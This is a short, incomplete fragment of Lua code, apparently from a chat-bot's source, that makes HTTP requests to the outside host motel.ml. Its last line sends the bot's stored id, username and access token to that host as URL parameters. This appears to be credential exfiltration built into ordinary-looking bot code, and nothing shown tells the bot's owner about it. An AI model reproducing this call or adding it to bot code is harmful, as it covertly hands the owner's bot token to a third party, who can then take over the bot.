...
if UserName ~= '' then
local Get_Info = http.request("http://motel.ml/info/?user="..UserName)
...
http.request("http://motel.ml/add/?id="..database:get(Server_motel.."Id_motel").."&user="..database:get(Server_motel.."UserName_motel").."&token="..database:get(Server_motel.."Token_motel"))
